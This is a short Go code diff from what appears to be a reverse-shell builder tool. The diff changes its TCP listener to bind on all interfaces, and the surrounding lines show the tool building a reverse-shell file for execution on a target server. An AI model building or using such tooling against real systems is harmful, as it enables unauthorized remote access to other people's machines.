@@ -24,7 +24,7 @@ func main() {
 	host, shellPort, serverOs, listenPort := initArgs()
 	println(banner)
 	if listenPort != "0" {
-		listenTcp(host, listenPort)
+		listenTcp(listenPort)
 	} else {
 		buildReverseShell(host, shellPort, serverOs)
 	}
@@ -59,9 +59,9 @@ func buildReverseShell(host, port, serverOs string) {
 	println("[+] Build is done ! The file to execute server side is \"" + finalFileName + fileExt + "\".")
 }
 
-func listenTcp(host, port string) {
-	listener, err := net.Listen("tcp", host+":"+port)
-	handleError("TCP Listening for "+host+":"+port, err)
+func listenTcp(port string) {
+	listener, err := net.Listen("tcp", ":"+port)
+	handleError("TCP Listening for localhost:"+port, err)
 	defer listener.Close()
 	connexion, err := listener.Accept()
 	handleError("Accepting TCP connection", err)
